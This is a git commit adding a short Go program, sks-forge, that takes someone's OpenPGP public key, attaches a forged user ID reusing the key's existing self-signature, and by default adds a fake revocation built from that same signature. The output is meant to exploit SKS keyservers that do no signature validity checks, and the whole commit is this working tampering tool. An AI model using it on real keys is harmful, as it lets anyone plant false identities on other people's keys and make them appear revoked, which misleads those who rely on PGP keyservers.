fb55cd6eb94dd8062b5a7b86c5c0629e26fb8ecb
Yegor Timoshenko <yegortimoshenko@riseup.net>
2018-06-12 11:09:11 +0000

    Add flags, rename sks-havoc to sks-forge

---
+++ sks-forge/main.go
@@ -0,0 +1,48 @@
+package main
+
+import (
+	"flag"
+	"golang.org/x/crypto/openpgp"
+	"golang.org/x/crypto/openpgp/packet"
+	"log"
+	"os"
+)
+
+func main() {
+	comment := flag.String("comment", "no validity checks", "UID comment")
+	email := flag.String("email", "@", "UID email")
+	name := flag.String("name", "Do not use SKS keyserver sites", "UID name")
+	revoke := flag.Bool("revoke", true, "whether to revoke key via fake signature")
+
+	flag.Parse()
+
+	entity, err := openpgp.ReadEntity(packet.NewReader(os.Stdin))
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	var sig *packet.Signature
+
+	for _, v := range entity.Identities {
+		sig = v.SelfSignature
+	}
+
+	packet := packet.NewUserId(*name, *comment, *email)
+
+	entity.Identities[packet.Id] = &openpgp.Identity{
+		Name:          packet.Id,
+		UserId:        packet,
+		SelfSignature: sig,
+	}
+
+	if *revoke {
+		entity.Revocations = append(entity.Revocations, sig)
+	}
+
+	err = entity.Serialize(os.Stdout)
+
+	if err != nil {
+		log.Fatal(err)
+	}
+}
